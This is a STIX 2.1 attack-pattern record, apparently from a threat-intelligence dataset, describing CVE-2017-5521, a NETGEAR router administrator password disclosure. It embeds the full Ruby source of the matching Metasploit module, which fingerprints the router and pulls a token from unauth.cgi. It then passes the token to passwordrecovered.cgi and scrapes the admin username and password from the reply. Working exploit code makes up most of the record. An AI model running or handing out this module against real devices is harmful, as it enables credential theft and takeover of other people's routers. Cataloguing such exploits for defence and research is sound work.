{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8e44fb05-db38-432d-94bd-47e15e24b2b7",
    "created": "2024-08-14T16:32:27.007398Z",
    "modified": "2024-08-14T16:32:27.007402Z",
    "name": "NETGEAR Administrator Password Disclosure",
    "description": " This module will collect the password for the `admin` user. The exploit will not complete if password recovery is set on the router. The password is received by passing the token generated from `unauth.cgi` to `passwordrecovered.cgi`. This exploit works on many different NETGEAR products. The full list of affected products is available in the 'References' section.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/netgear_password_disclosure.rb",
            "external_id": "netgear_password_disclosure.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-5521"
        },
        {
            "source_name": "reference",
            "url": "https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=18758"
        },
        {
            "source_name": "reference",
            "url": "https://thehackernews.com/2017/01/Netgear-router-password-hacking.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cve-2017-5521-bypassing-authentication-on-netgear-routers/"
        },
        {
            "source_name": "reference",
            "url": "https://pastebin.com/dB4bTgxz"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'NETGEAR Administrator Password Disclosure',\n      'Description'    => %q{\n        This module will collect the password for the `admin` user.\n        The exploit will not complete if password recovery is set on the router.\n        The password is received by passing the token generated from `unauth.cgi`\n        to `passwordrecovered.cgi`. This exploit works on many different NETGEAR\n        products. The full list of affected products is available in the 'References'\n        section.\n\n      },\n      'Author'         =>\n        [\n          'Simon Kenin', # Vuln Discovery, PoC\n          'thecarterb'   # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2017-5521' ],\n          [ 'URL', 'https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=18758' ],\n          [ 'URL', 'https://thehackernews.com/2017/01/Netgear-router-password-hacking.html'],\n          [ 'URL', 'https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cve-2017-5521-bypassing-authentication-on-netgear-routers/'],\n          [ 'URL', 'https://pastebin.com/dB4bTgxz'],\n          [ 'EDB', '41205']\n        ],\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options(\n    [\n      OptString::new('TARGETURI', [true, 'The base path to the vulnerable application', '/'])\n    ])\n  end\n\n  # @return substring of 'text', usually a response from a server in this case\n  def scrape(text, start_trig, end_trig)\n    text[/#{start_trig}(.*?)#{end_trig}/m, 1]\n  end\n\n  def run\n    uri = target_uri.path\n    uri = normalize_uri(uri)\n    print_status(\"Checking if #{rhost} is a NETGEAR router\")\n    vprint_status(\"Sending request to http://#{rhost}/\")\n\n    # will always call check no matter what\n    is_ng = check\n\n    res = send_request_cgi({ 'uri' => uri })\n    if res.nil?\n      print_error(\"#{rhost} returned an empty response.\")\n      return\n    end\n\n    if is_ng == Exploit::CheckCode::Detected\n      marker_one = \"id=\"\n      marker_two = \"\\\"\"\n      token = scrape(res.to_s, marker_one, marker_two)\n      if token.nil?\n        print_error(\"#{rhost} is not vulnerable: Token not found\")\n        return\n      end\n\n      if token == '0'\n        print_status(\"If no creds are found, try the exploit again. #{rhost} returned a token of 0\")\n      end\n      print_status(\"Token found: #{token}\")\n      vprint_status(\"Token found at #{rhost}/unauth.cgi?id=#{token}\")\n\n      r = send_request_cgi({\n        'uri' => \"/passwordrecovered.cgi\",\n        'vars_get' => { 'id'  =>  token }\n      })\n\n      vprint_status(\"Sending request to #{rhost}/passwordrecovered.cgi?id=#{token}\")\n\n      html = r.get_html_document\n      raw_html = html.text\n\n      username = scrape(raw_html, \"Router Admin Username\", \"Router Admin Password\")\n      password = scrape(raw_html, \"Router Admin Password\", \"You can\")\n      if username.nil? || password.nil?\n        print_error(\"#{rhost} returned empty credentials\")\n        return\n      end\n      username.strip!\n      password.strip!\n\n      if username.empty? || password.empty?\n        print_error(\"No Creds found\")\n      else\n        print_good(\"Creds found: #{username}/#{password}\")\n      end\n    else\n      print_error(\"#{rhost} is not vulnerable: Not a NETGEAR device\")\n    end\n  end\n\n  # Almost every NETGEAR router sends a 'WWW-Authenticate' header in the response\n  # This checks the response for that header.\n  def check\n\n    res = send_request_cgi({'uri'=>'/'})\n    if res.nil?\n      fail_with(Failure::Unreachable, 'Connection timed out.')\n    end\n\n    # Checks for the `WWW-Authenticate` header in the response\n    if res.headers[\"WWW-Authenticate\"]\n      data = res.to_s\n      marker_one = \"Basic realm=\\\"\"\n      marker_two = \"\\\"\"\n      model = data[/#{marker_one}(.*?)#{marker_two}/m, 1]\n      print_good(\"Router is a NETGEAR router (#{model})\")\n      return Exploit::CheckCode::Detected\n    else\n      print_error('Router is not a NETGEAR router')\n      return Exploit::CheckCode::Safe\n    end\n  end\nend\n"
}